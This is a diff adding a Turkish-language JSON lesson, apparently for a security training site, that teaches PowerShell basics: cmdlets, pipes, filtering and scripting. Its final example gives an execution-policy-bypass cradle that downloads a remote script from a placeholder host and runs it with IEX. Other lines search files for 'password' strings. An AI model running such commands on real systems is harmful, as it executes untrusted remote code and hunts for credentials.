@@ -1,0 +1,211 @@
+{
+  "id": "powershell-basics",
+  "slug": "powershell-basics",
+  "title": "PowerShell Temelleri",
+  "subtitle": "Modern Windows Komut Satırı",
+  "description": "PowerShell'i sıfırdan öğren. Cmdlet'ler, pipe, değişkenler, Where-Object, scripting temelleri ve güvenlik komutları.",
+  "icon": "Code",
+  "order": 2,
+  "tags": ["powershell", "cmdlet", "Get-ChildItem", "pipe", "windows", "scripting"],
+  "modules": [
+    {
+      "id": "ps-intro",
+      "title": "PowerShell'e Giriş",
+      "description": "PowerShell nedir, nasıl açılır, cmdlet mantığı",
+      "difficulty": "beginner",
+      "duration": "10 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "PowerShell Nedir?",
+          "content": "**PowerShell:** Microsoft'un modern komut satırı ve scripting ortamı. CMD'nin çok daha güçlü hali.\n\n**Farkları:**\n- CMD metin tabanlı, PowerShell **nesne** tabanlı\n- Pipe'da nesneler akar, sadece metin değil\n- .NET kütüphanelerine tam erişim\n\n**Nasıl açılır:**\n- `Win + X` → Windows PowerShell (Admin)\n- Başlat → 'powershell' ara → Yönetici olarak çalıştır\n- Win + R → `powershell` → Enter\n\n**Cmdlet formatı:** `Fiil-İsim`\n```\nGet-ChildItem    → Dosyaları listele\nSet-Location     → Dizin değiştir\nNew-Item         → Yeni dosya/dizin oluştur\nRemove-Item      → Sil\nGet-Content      → İçerik oku\nGet-Process      → Süreçleri listele\nGet-Service      → Servisleri listele\n```\n\n**Execution Policy (Çalıştırma Politikası):**\n```powershell\nGet-ExecutionPolicy           # Mevcut politikayı gör\nSet-ExecutionPolicy Bypass    # Scripti geçici çalıştır\nSet-ExecutionPolicy RemoteSigned  # Önerilen\n```"
+        }
+      ]
+    },
+    {
+      "id": "basic-cmdlets",
+      "title": "Temel Cmdlet'ler",
+      "description": "Dosya sistemi, içerik okuma, kopyalama, silme",
+      "difficulty": "beginner",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Temel PowerShell Komutları",
+          "commands": [
+            {
+              "command": "Get-ChildItem\n# Kısaltma: ls veya dir (alias olarak çalışır)",
+              "description": "Mevcut dizindeki dosya ve klasörleri listele",
+              "output": "    Directory: C:\\Users\\burak\n\nMode    LastWriteTime     Length Name\n----    -------------     ------ ----\nd----- 08.06.2026 10:00         Desktop\nd----- 08.06.2026 09:00         Documents\n-a---- 08.06.2026 08:15   1337  notlar.txt"
+            },
+            {
+              "command": "Get-ChildItem -Hidden",
+              "description": "Gizli dosyaları göster"
+            },
+            {
+              "command": "Get-ChildItem -Recurse -Filter '*.txt'",
+              "description": "Alt dizinlerde de .txt dosyalarını ara"
+            },
+            {
+              "command": "Set-Location C:\\Users\\burak\\Desktop\n# Kısaltma: cd (alias)",
+              "description": "Dizin değiştir"
+            },
+            {
+              "command": "New-Item -ItemType Directory -Name 'pentest-notlar'",
+              "description": "Yeni klasör oluştur"
+            },
+            {
+              "command": "New-Item -ItemType File -Name 'notlar.txt'",
+              "description": "Yeni boş dosya oluştur"
+            },
+            {
+              "command": "New-Item -ItemType Directory -Force -Path 'CTF\\web\\sql'",
+              "description": "İç içe dizin oluştur (-Force = varsa hata verme)"
+            },
+            {
+              "command": "Get-Content notlar.txt\n# Kısaltma: cat (alias)",
+              "description": "Dosya içeriğini oku"
+            },
+            {
+              "command": "Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts",
+              "description": "hosts dosyasını oku (siber güvenlikte sık kullanılır)"
+            },
+            {
+              "command": "Set-Content -Path notlar.txt -Value 'Merhaba PowerShell!'",
+              "description": "Dosyaya içerik yaz (üstüne yazar)"
+            },
+            {
+              "command": "Add-Content -Path notlar.txt -Value 'Yeni satır eklendi'",
+              "description": "Dosyanın sonuna ekle (append)"
+            },
+            {
+              "command": "Copy-Item dosya.txt -Destination C:\\Yedek\\",
+              "description": "Dosyayı kopyala"
+            },
+            {
+              "command": "Copy-Item -Recurse klasor\\ -Destination C:\\Yedek\\",
+              "description": "Klasörü recursive kopyala"
+            },
+            {
+              "command": "Move-Item dosya.txt -Destination C:\\Desktop\\",
+              "description": "Taşı"
+            },
+            {
+              "command": "Rename-Item dosya.txt -NewName yeni-dosya.txt",
+              "description": "Yeniden adlandır"
+            },
+            {
+              "command": "Remove-Item dosya.txt",
+              "description": "Sil"
+            },
+            {
+              "command": "Remove-Item -Recurse -Force klasor\\",
+              "description": "Klasörü ve içeriğini sil"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "pipe-filtering",
+      "title": "Pipe ve Filtreleme",
+      "description": "Where-Object, Select-Object, Sort-Object, pipe zinciri",
+      "difficulty": "intermediate",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Pipe ve Filtreleme Komutları",
+          "commands": [
+            {
+              "command": "Get-Process | Where-Object {$_.CPU -gt 10}",
+              "description": "CPU kullanımı 10'dan fazla olan süreçleri filtrele",
+              "tip": "$_ = pipe'dan gelen nesne (her eleman için). Like Linux'ta her satır için."
+            },
+            {
+              "command": "Get-Service | Where-Object {$_.Status -eq 'Running'}",
+              "description": "Çalışan servisleri filtrele"
+            },
+            {
+              "command": "Get-ChildItem C:\\ -Recurse | Where-Object {$_.Length -gt 100MB}",
+              "description": "100 MB'dan büyük dosyaları bul"
+            },
+            {
+              "command": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10",
+              "description": "CPU'ya göre sırala, en yüksek 10'u seç",
+              "output": "Handles NPM(K) PM(K)  CPU(s)  Name\n------- ------ ------  ------  ----\n   1337    100  350000  45.2   chrome"
+            },
+            {
+              "command": "Get-Process | Select-Object Name, CPU, WorkingSet",
+              "description": "Sadece belirli özellikleri seç"
+            },
+            {
+              "command": "Select-String -Path 'C:\\*.txt' -Pattern 'password'",
+              "description": "Dosyalarda metin ara (Linux'ta grep gibi)",
+              "output": "notlar.txt:5:password=admin123"
+            },
+            {
+              "command": "Get-ChildItem -Recurse | Select-String -Pattern 'password'",
+              "description": "Alt dizinlerde de arama"
+            },
+            {
+              "command": "Get-Content access.log | Select-String '404' | Measure-Object",
+              "description": "404 hata sayısını say"
+            },
+            {
+              "command": "Get-Process | Format-Table Name, ID, CPU -AutoSize",
+              "description": "Tablo formatında göster"
+            },
+            {
+              "command": "Get-Service | Export-Csv -Path C:\\servisler.csv -NoTypeInformation",
+              "description": "Çıktıyı CSV dosyasına aktar"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "ps-variables",
+      "title": "Değişkenler ve Scripting",
+      "description": "PowerShell değişkenleri, if/else, döngüler",
+      "difficulty": "intermediate",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "PowerShell Scripting",
+          "commands": [
+            {
+              "command": "$ad = 'Burak'\n$yas = 25\n$ip = '192.168.1.100'\n\nWrite-Host \"Merhaba $ad!\"\nWrite-Host \"IP: $ip, Yaş: $yas\"",
+              "description": "Değişken tanımlama ($değişken formatı)"
+            },
+            {
+              "command": "$tarih = Get-Date -Format 'yyyy-MM-dd'\n$kullanici = $env:USERNAME\n$bilgisayar = $env:COMPUTERNAME\n\nWrite-Host \"$kullanici - $bilgisayar - $tarih\"",
+              "description": "Komut çıktısını değişkene ata, ortam değişkenleri"
+            },
+            {
+              "command": "if ($env:USERNAME -eq 'Administrator') {\n    Write-Host 'Admin olarak çalışıyorsun!'\n} elseif (Test-Path 'C:\\Windows') {\n    Write-Host 'Windows sistemi'\n} else {\n    Write-Host 'Bilinmeyen durum'\n}",
+              "description": "if-elseif-else koşul yapısı"
+            },
+            {
+              "command": "foreach ($servis in Get-Service) {\n    if ($servis.Status -eq 'Running') {\n        Write-Host \"[ÇALIŞIYOR] $($servis.Name)\"\n    }\n}",
+              "description": "foreach döngüsü ile servisleri listele"
+            },
+            {
+              "command": "1..10 | ForEach-Object {\n    Write-Host \"Sayı: $_\"\n}",
+              "description": "1'den 10'a kadar döngü"
+            },
+            {
+              "command": "# PowerShell script dosyası (pentest.ps1):\n# Çalıştırma:\npowershell -ExecutionPolicy Bypass -File pentest.ps1\n\n# Veya:\npowershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://IP/script.ps1')\"",
+              "description": "Script çalıştırma ve uzaktan indirme"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
